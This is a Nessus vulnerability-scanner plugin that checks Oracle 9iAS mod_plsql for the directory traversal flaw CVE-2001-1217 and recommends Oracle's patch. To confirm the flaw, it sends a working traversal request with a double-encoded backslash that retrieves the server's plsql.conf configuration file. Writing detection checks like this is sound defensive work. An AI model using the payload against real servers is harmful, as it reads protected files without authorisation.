#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10854);
 script_version("$Revision: 1.12 $");

 script_cve_id("CVE-2001-1217");
 script_bugtraq_id(3727);
 script_xref(name:"OSVDB", value:"711");

 name["english"] = "Oracle 9iAS mod_plsql directory traversal";
 name["francais"] = "Oracle 9iAS mod_plsql directory traversal";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
In a default installation of Oracle 9iAS, it is possible 
to  use the  mod_plsql module to perform a directory traversal attack.


Solution: 
Download the patch from the oracle metalink site.

References:
http://otn.oracle.com/deploy/security/pdf/modplsql.pdf
http://www.nextgenss.com/advisories/plsql.txt
http://www.oracle.com

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for Oracle9iAS mod_plsql directory traversal";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "Databases";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/OracleApache");
 exit(0);
}

# Check starts here

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{ 
# Make a request for the Admin_ interface.
 req = http_get(item:"/pls/sample/admin_/help/..%255cplsql.conf",
 		port:port);
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if("Directives added for mod-plsql" >< r)	
 	security_hole(port);

 }
}
